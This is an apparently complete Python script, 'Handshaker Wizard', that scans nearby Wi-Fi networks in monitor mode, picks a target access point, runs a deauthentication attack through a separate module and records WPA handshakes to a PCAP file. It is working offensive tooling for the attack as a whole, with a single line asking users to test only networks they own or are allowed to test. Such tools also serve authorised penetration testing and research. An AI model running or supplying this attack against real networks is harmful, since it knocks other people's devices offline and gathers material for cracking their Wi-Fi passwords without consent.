#!/usr/bin/env python3

import os
import re
import sys
import time
import subprocess
import threading
import logging
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.environ.get("SWISSKNIFE_LOG_DIR", os.path.join(PROJECT_ROOT, "log"))
DEFAULT_HANDSHAKE_DIR = os.environ.get(
    "SWISSKNIFE_HANDSHAKE_DIR", os.path.join(LOG_DIR, "handshakes")
)

DEFAULT_MONITOR_CHANNELS = (
    list(range(1, 15))
    + [
        36,
        40,
        44,
        48,
        52,
        56,
        60,
        64,
        100,
        104,
        108,
        112,
        116,
        120,
        124,
        128,
        132,
        136,
        140,
        144,
        149,
        153,
        157,
        161,
        165,
    ]
)
DEFAULT_HOP_INTERVAL = 0.8
DEFAULT_LIVE_UPDATE_INTERVAL = 0.5
MONITOR_SETTLE_SECONDS = 2.0

try:
    from scapy.all import (  # type: ignore
        AsyncSniffer,
        Dot11,
        Dot11Beacon,
        Dot11Elt,
        Dot11ProbeResp,
        EAPOL,
        PcapWriter,
    )
    from scapy.error import Scapy_Exception  # type: ignore
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False
    Scapy_Exception = Exception  # type: ignore

# Optional local module: modules/deauth.py
try:
    import deauth
    DEAUTH_AVAILABLE = True
    DEAUTH_IMPORT_ERROR: Optional[str] = None
except Exception as exc:
    deauth = None  # type: ignore[assignment]
    DEAUTH_AVAILABLE = False
    DEAUTH_IMPORT_ERROR = str(exc)

def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(["ethtool", "-i", interface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=False)
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(["iw", "dev", interface, "info"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
    if result.returncode != 0:
        return None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(["iw", "dev", interface, "set", "type", mode], stderr=subprocess.PIPE, text=True, check=False)
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def wait_for_monitor_settle(interface: str) -> None:
    if MONITOR_SETTLE_SECONDS <= 0:
        return
    time.sleep(MONITOR_SETTLE_SECONDS)


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def build_box(lines: List[str]) -> str:
    width = max(len(line) for line in lines)
    border = "+" + "-" * (width + 2) + "+"
    body = [f"| {line.ljust(width)} |" for line in lines]
    return "\n".join([border, *body, border])


def display_scan_live(networks: int, clients: int, interface: str, status: str, remaining: int) -> None:
    lines = [
        f"Handshaker scan on {interface}",
        f"Networks: {networks}",
        f"Clients:  {clients}",
        f"Status:   {status.upper()}",
        f"Time left: {remaining}s",
    ]
    output = build_box(lines)
    if COLOR_ENABLED:
        sys.stdout.write("\033[2J\033[H" + output + "\n")
    else:
        sys.stdout.write(output + "\n")
    sys.stdout.flush()


def format_ssid(ssid: str, max_len: int = 24) -> str:
    if not ssid:
        return "<hidden>"
    cleaned = " ".join(ssid.split())
    if not cleaned:
        return "<hidden>"
    if len(cleaned) <= max_len:
        return cleaned
    return cleaned[: max_len - 3].rstrip() + "..."


def extract_ssid(packet) -> str:
    if not packet.haslayer(Dot11Elt):
        return "<hidden>"
    elt = packet[Dot11Elt]
    while isinstance(elt, Dot11Elt):
        if elt.ID == 0:
            ssid_bytes = elt.info or b""
            if not ssid_bytes or b"\x00" in ssid_bytes:
                return "<hidden>"
            try:
                return ssid_bytes.decode("utf-8")
            except UnicodeDecodeError:
                return "<non-printable>"
        elt = elt.payload
    return "<hidden>"


def extract_channel(packet) -> Optional[int]:
    if not packet.haslayer(Dot11Elt):
        return None
    elt = packet[Dot11Elt]
    while isinstance(elt, Dot11Elt):
        if elt.ID == 3 and elt.info:
            channel = elt.info[0]
            if 1 <= channel <= 196:
                return int(channel)
        if elt.ID == 61 and elt.info:
            channel = elt.info[0]
            if 1 <= channel <= 196:
                return int(channel)
        elt = elt.payload
    return None


def parse_rsn_akm_suites(info: bytes) -> List[int]:
    if len(info) < 8:
        return []
    idx = 0
    idx += 2
    idx += 4
    if idx + 2 > len(info):
        return []
    pairwise_count = int.from_bytes(info[idx:idx + 2], "little")
    idx += 2 + pairwise_count * 4
    if idx + 2 > len(info):
        return []
    akm_count = int.from_bytes(info[idx:idx + 2], "little")
    idx += 2
    akm_types: List[int] = []
    for _ in range(akm_count):
        if idx + 4 > len(info):
            break
        akm_types.append(info[idx + 3])
        idx += 4
    return akm_types


def extract_security(packet) -> str:
    privacy = False
    wpa = False
    rsn = False
    wpa3 = False
    if packet.haslayer(Dot11Beacon):
        cap_info = packet.sprintf("%Dot11Beacon.cap%")
    else:
        cap_info = packet.sprintf("%Dot11ProbeResp.cap%")
    if "privacy" in cap_info:
        privacy = True
    elt = packet[Dot11Elt] if packet.haslayer(Dot11Elt) else None
    while isinstance(elt, Dot11Elt):
        if elt.ID == 48:
            rsn = True
            akm_types = parse_rsn_akm_suites(elt.info or b"")
            if any(akm in (8, 9) for akm in akm_types):
                wpa3 = True
        elif elt.ID == 221 and elt.info.startswith(b"\x00P\xf2\x01\x01\x00"):
            wpa = True
        elt = elt.payload
    if rsn:
        return "WPA3" if wpa3 else "WPA2"
    if wpa:
        return "WPA"
    if privacy:
        return "WEP"
    return "OPEN"


def is_unicast(mac_address: Optional[str]) -> bool:
    if not mac_address:
        return False
    try:
        first_octet = int(mac_address.split(":")[0], 16)
    except:
        return False
    return (first_octet & 1) == 0


def is_valid_mac(mac_address: Optional[str]) -> bool:
    if not mac_address:
        return False
    lower = mac_address.lower()
    if lower in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        return False
    if lower.startswith(("01:00:5e", "01:80:c2", "33:33")):
        return False
    if len(lower.split(":")) != 6:
        return False
    return True


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    security: str
    channel: Optional[int] = None
    clients: Set[str] = field(default_factory=set)

    def update_security(self, new_security: str) -> None:
        priority = {"OPEN": 0, "WEP": 1, "WPA": 2, "WPA2": 3, "WPA3": 4}
        if priority.get(new_security, -1) > priority.get(self.security, -1):
            self.security = new_security

    def update_channel(self, new_channel: Optional[int]) -> None:
        if new_channel is not None:
            self.channel = new_channel


def channel_hopper(interface: str, channels: List[int], interval: float, stop_event: threading.Event) -> None:
    if not channels:
        return
    while not stop_event.is_set():
        for channel in channels:
            if stop_event.is_set():
                break
            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            time.sleep(interval)


def scan_networks(
    interface: str,
    duration_seconds: int,
    channels: List[int],
    hop_interval: float,
    update_interval: float,
) -> Dict[str, AccessPoint]:
    aps: Dict[str, AccessPoint] = {}
    aps_lock = threading.Lock()

    def handle_packet(packet) -> None:
        if not packet.haslayer(Dot11):
            return

        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            bssid = packet[Dot11].addr3
            if not bssid or not is_valid_mac(bssid):
                return
            ssid = extract_ssid(packet)
            security = extract_security(packet)
            channel = extract_channel(packet)
            with aps_lock:
                ap = aps.get(bssid)
                if ap is None:
                    aps[bssid] = AccessPoint(ssid=ssid, bssid=bssid, security=security, channel=channel)
                else:
                    if ap.ssid == "<hidden>" and ssid != "<hidden>":
                        ap.ssid = ssid
                    ap.update_security(security)
                    ap.update_channel(channel)

        sender = packet.addr2
        receiver = packet.addr1
        with aps_lock:
            if sender in aps and is_unicast(receiver):
                aps[sender].clients.add(receiver)
            if receiver in aps and is_unicast(sender):
                aps[receiver].clients.add(sender)

    sniffer: Optional[AsyncSniffer] = None
    status = "starting"
    last_restart = 0.0
    last_error = ""
    restart_delay = 1.0

    def start_sniffer() -> None:
        nonlocal sniffer, status, last_restart, last_error
        now = time.time()
        if now - last_restart < restart_delay:
            status = "restarting"
            return
        last_restart = now
        try:
            sniffer = AsyncSniffer(iface=interface, prn=handle_packet, store=False)
            sniffer.start()
            status = "running"
        except Exception as exc:
            status = "error"
            if str(exc) != last_error:
                logging.error("Sniffer failed to start: %s", exc)
                last_error = str(exc)
            sniffer = None

    start_sniffer()

    stop_event = threading.Event()
    hopper_thread: Optional[threading.Thread] = None
    if channels:
        hopper_thread = threading.Thread(target=channel_hopper, args=(interface, channels, hop_interval, stop_event), daemon=True)
        hopper_thread.start()

    end_time = time.time() + max(1, duration_seconds)
    while time.time() < end_time:
        if sniffer is None or not getattr(sniffer, "running", False):
            start_sniffer()
        with aps_lock:
            networks = len(aps)
            clients = sum(len(ap.clients) for ap in aps.values())
        remaining = max(0, int(end_time - time.time()))
        display_scan_live(networks, clients, interface, status, remaining)
        time.sleep(max(0.2, update_interval))

    stop_event.set()
    try:
        if sniffer and getattr(sniffer, "running", False):
            sniffer.stop()
    except Scapy_Exception:
        pass

    if hopper_thread:
        hopper_thread.join(timeout=2)

    return aps


def sorted_access_points(aps: Dict[str, AccessPoint]) -> List[AccessPoint]:
    return sorted(aps.values(), key=lambda ap: len(ap.clients), reverse=True)


def format_network_lines(sorted_aps: List[AccessPoint]) -> List[str]:
    if not sorted_aps:
        return [color_text("No networks found.", COLOR_WARNING)]

    lines: List[str] = [style("Observed networks (sorted by clients):", STYLE_BOLD)]
    for index, ap in enumerate(sorted_aps, start=1):
        ssid_label = format_ssid(ap.ssid)
        channel_label = str(ap.channel) if ap.channel else "?"

        security_color = (
            COLOR_SUCCESS
            if ap.security in {"WPA", "WPA2"}
            else COLOR_WARNING
            if ap.security == "WPA3"
            else COLOR_DIM
        )
        security_label = color_text(ap.security, security_color)

        label = f"{index}) {ssid_label} ({ap.bssid}) -"
        details = f"ch {channel_label} | {security_label} | clients {len(ap.clients)}"
        lines.append(f"  {color_text(label, COLOR_HIGHLIGHT)} {details}")
    return lines


def select_access_point(sorted_aps: List[AccessPoint]) -> Optional[AccessPoint]:
    if not sorted_aps:
        return None
    while True:
        choice = input(f"{style('Select target AP', STYLE_BOLD)} (number, or 'q' to quit): ").strip().lower()
        if choice in ("q", "quit", "exit"):
            return None
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(sorted_aps):
                return sorted_aps[idx - 1]
        logging.warning("Invalid selection. Try again.")


def set_interface_channel(interface: str, channel: int) -> bool:
    result = subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, check=False)
    if result.returncode != 0:
        logging.error("Failed to set channel %s: %s", channel, result.stderr.strip() or "unknown error")
        return False
    time.sleep(0.3)
    return True


def packet_matches_bssid(packet, bssid: str) -> bool:
    if not packet.haslayer(Dot11):
        return False
    dot11 = packet[Dot11]
    return bssid.lower() in (dot11.addr1 or "", dot11.addr2 or "", dot11.addr3 or "")


deauth_running = False


def run_deauth_background(interface: str, target: Dict[str, Optional[str]], duration_sec: int = 20):
    global deauth_running

    if not DEAUTH_AVAILABLE:
        reason = f" ({DEAUTH_IMPORT_ERROR})" if DEAUTH_IMPORT_ERROR else ""
        logging.warning("Deauth module is not available%s; continuing without deauth.", reason)
        return

    logging.info(color_text("\n[DEAUTH] Starting deauthentication attack...", COLOR_WARNING))

    try:
        deauth_running = True
        success = deauth.start_deauth_attack(interface, target)
        if success:
            logging.info(color_text("Deauth running...", COLOR_SUCCESS))
            time.sleep(duration_sec)
        else:
            logging.warning("Failed to start deauth; continuing without it.")
    except Exception as exc:
        logging.error("Deauth error: %s", exc)
    finally:
        if deauth_running:
            deauth.stop_attack()
            logging.info(color_text("Deauth stopped.", COLOR_SUCCESS))
        deauth_running = False


def capture_full_handshakes(
    interface: str,
    ap: AccessPoint,
    total_duration_sec: int = 45,
    deauth_duration_sec: int = 20,
    output_dir: str = DEFAULT_HANDSHAKE_DIR,
) -> Optional[Dict]:
    os.makedirs(output_dir, exist_ok=True)

    bssid_clean = ap.bssid.replace(":", "")
    ssid_clean = re.sub(r'[^A-Za-z0-9_-]', '_', ap.ssid or "hidden")[:32]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_path = os.path.join(output_dir, f"handshake_{bssid_clean}_{ssid_clean}_{timestamp}.pcap")

    writer = None
    sniffer = None
    handshake_count = 0
    total_packets = 0
    eapol_count = 0
    clients_with_eapol = set()

    eapol_states: Dict[str, int] = {}  # client_mac -> number of EAPOL messages seen

    start_time: Optional[float] = None
    started = False

    try:
        writer = PcapWriter(pcap_path, append=False, sync=True)

        def packet_handler(pkt):
            nonlocal total_packets, eapol_count, handshake_count

            if not pkt.haslayer(Dot11):
                return

            total_packets += 1

            # Write every packet to PCAP (filter later in Wireshark).
            writer.write(pkt)

            if pkt.haslayer(EAPOL):
                eapol_count += 1
                if packet_matches_bssid(pkt, ap.bssid):
                    client = pkt.addr1 if pkt.addr1 != ap.bssid else pkt.addr2
                    if client and is_valid_mac(client):
                        clients_with_eapol.add(client)
                        if client not in eapol_states:
                            eapol_states[client] = 0
                        eapol_states[client] += 1

                        # Very simple heuristic: 4 consecutive EAPOL messages -> likely full 4-way handshake.
                        if eapol_states[client] >= 4:
                            handshake_count += 1
                            eapol_states[client] = 0  # Reset counter after a likely complete handshake.
                            logging.info(
                                color_text(
                                    f"[+] Possible complete 4-way handshake detected (client: {client})",
                                    COLOR_SUCCESS,
                                )
                            )

        sniffer = AsyncSniffer(iface=interface, prn=packet_handler, store=False)
        sniffer.start()

        start_time = time.time()
        started = True

        # Start deauth in a background thread.
        target_dict = {
            "bssid": ap.bssid,
            "ssid": ap.ssid,
            "channel": ap.channel,
        }

        if deauth_duration_sec > 0:
            deauth_thread = threading.Thread(
                target=run_deauth_background,
                args=(interface, target_dict, deauth_duration_sec),
                daemon=True,
            )
            deauth_thread.start()

        # Main capture loop.
        while True:
            elapsed = int(time.time() - start_time)
            remaining = total_duration_sec - elapsed
            if remaining <= 0:
                break

            status = f"Capture: {elapsed}s / {total_duration_sec}s   EAPOL: {eapol_count}   Handshakes: {handshake_count}"
            print(f"\r{status.ljust(80)}", end="", flush=True)
            time.sleep(1)

    except KeyboardInterrupt:
        logging.info("\nInterrupted by user (Ctrl+C).")
    except Exception as exc:
        logging.error("Capture failed: %s", exc)
        return None
    finally:
        if sniffer:
            try:
                sniffer.stop()
            except:
                pass
        if writer:
            writer.close()

        # Ensure we end the live "\r" progress line cleanly.
        print("")

        if started:
            duration_sec = int(time.time() - (start_time or time.time()))
        else:
            duration_sec = 0

        logging.info("")
        logging.info("=" * 70)
        logging.info(style("Capture summary:", STYLE_BOLD))
        logging.info("  File:             %s", pcap_path)
        logging.info("  Duration:         %s seconds", duration_sec)
        logging.info("  Total packets:    %s", total_packets)
        logging.info("  EAPOL packets:    %s", eapol_count)
        logging.info("  Handshakes:       %s", handshake_count)
        logging.info("  Clients w/ EAPOL: %s", len(clients_with_eapol))
        logging.info("=" * 70)

    return {
        "path": pcap_path,
        "total_packets": total_packets,
        "eapol_packets": eapol_count,
        "detected_handshakes": handshake_count,
        "clients_with_eapol": len(clients_with_eapol)
    }


def main() -> None:
    logging.info(color_text("Handshaker Wizard", COLOR_HEADER))
    logging.info("Scan → select AP → deauth → capture handshakes (PCAP)")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    if not SCAPY_AVAILABLE:
        logging.error("Scapy is not installed. Install with: pip3 install scapy")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    if not DEAUTH_AVAILABLE:
        reason = f" ({DEAUTH_IMPORT_ERROR})" if DEAUTH_IMPORT_ERROR else ""
        logging.warning("Deauth module: unavailable%s. Capture will run without deauth.", reason)

    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test!")
    logging.info("")

    interfaces = list_network_interfaces()
    interface = select_interface(interfaces)

    original_mode = get_interface_mode(interface)
    changed_to_monitor = False

    try:
        if original_mode != "monitor":
            logging.info("")
            input(f"{style('Press Enter', STYLE_BOLD)} to switch {interface} to monitor mode...")
            if not set_interface_type(interface, "monitor"):
                logging.error("Failed to enable monitor mode on %s.", interface)
                sys.exit(1)
            changed_to_monitor = True
            wait_for_monitor_settle(interface)

        logging.info("")
        scan_duration = prompt_int(
            f"{style('Scan duration', STYLE_BOLD)} (seconds) "
            f"({style('Enter', STYLE_BOLD)} = 15s): ",
            default=15
        )

        logging.info("")
        input(f"{style('Press Enter', STYLE_BOLD)} to start scanning...")
        aps = scan_networks(
            interface,
            scan_duration,
            channels=DEFAULT_MONITOR_CHANNELS,
            hop_interval=DEFAULT_HOP_INTERVAL,
            update_interval=DEFAULT_LIVE_UPDATE_INTERVAL,
        )

        sorted_aps = sorted_access_points(aps)
        logging.info("")
        for line in format_network_lines(sorted_aps):
            logging.info("%s", line)

        if not sorted_aps:
            logging.info("No networks found.")
            return

        logging.info("")
        target_ap = select_access_point(sorted_aps)
        if target_ap is None:
            logging.info("No target selected. Exiting.")
            return

        logging.info("")
        logging.info("Selected: %s (%s)", format_ssid(target_ap.ssid), target_ap.bssid)
        if target_ap.channel:
            logging.info("Channel: %s", target_ap.channel)
            set_interface_channel(interface, target_ap.channel)
        else:
            logging.warning("AP channel unknown; staying on the current channel.")

        capture_total_sec = prompt_int(
            f"{style('Total capture time', STYLE_BOLD)} (seconds) "
            f"({style('Enter', STYLE_BOLD)} = 45s): ",
            default=45,
            minimum=20
        )

        # Keep deauth shorter than the total capture window.
        deauth_sec = min(25, capture_total_sec - 10)
        if not DEAUTH_AVAILABLE:
            deauth_sec = 0

        logging.info("")
        input(f"{style('Press Enter', STYLE_BOLD)} to start deauth + capture...")

        output_dir = DEFAULT_HANDSHAKE_DIR
        summary = capture_full_handshakes(
            interface=interface,
            ap=target_ap,
            total_duration_sec=capture_total_sec,
            deauth_duration_sec=deauth_sec,
            output_dir=output_dir
        )

        if summary:
            logging.info("")
            logging.info(style("Saved to:", STYLE_BOLD))
            logging.info(f"  → {summary['path']}")
            logging.info("  Detected full handshakes: %s", summary["detected_handshakes"])
            logging.info("Open in Wireshark and filter: eapol")

    finally:
        if changed_to_monitor:
            logging.info("Restoring managed mode...")
            restore_managed_mode(interface)

    input(style("\nPress Enter to exit.", STYLE_BOLD))


if __name__ == "__main__":
    main()
